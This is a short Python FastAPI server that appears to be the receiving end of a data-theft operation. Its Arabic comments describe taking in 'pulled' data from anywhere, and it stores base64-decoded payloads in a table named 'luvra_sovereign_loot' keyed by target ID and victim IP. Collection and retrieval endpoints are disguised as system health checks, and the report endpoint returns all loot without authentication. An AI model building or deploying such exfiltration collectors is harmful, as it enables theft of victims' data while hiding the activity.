from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import psycopg2
from psycopg2.extras import RealDictCursor
import os, json, base64

app = FastAPI()

# إعداد CORS لضمان استقبال البيانات من أي مكان دون حظر
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_db_conn():
    return psycopg2.connect(os.environ.get("DATABASE_URL"), sslmode='require')

@app.on_event("startup")
def setup_db():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS luvra_sovereign_loot (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            data JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

@app.post("/api/v1/sys/health/sync")
async def sync_data(request: Request):
    client_ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    try:
        raw_body = await request.body()
        # فك تشفير البيانات الضخمة المسحوبة
        decoded = json.loads(base64.b64decode(raw_body).decode('utf-8'))
        
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO luvra_sovereign_loot (target_id, gift_tag, ip_address, data)
            VALUES (%s, %s, %s, %s)
        """, (decoded.get('tid'), decoded.get('tag'), client_ip, json.dumps(decoded)))
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "ok"}
    except:
        return {"status": "ok"}

@app.get("/api/v1/sys/health/report")
async def get_report():
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM luvra_sovereign_loot ORDER BY created_at DESC")
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return rows
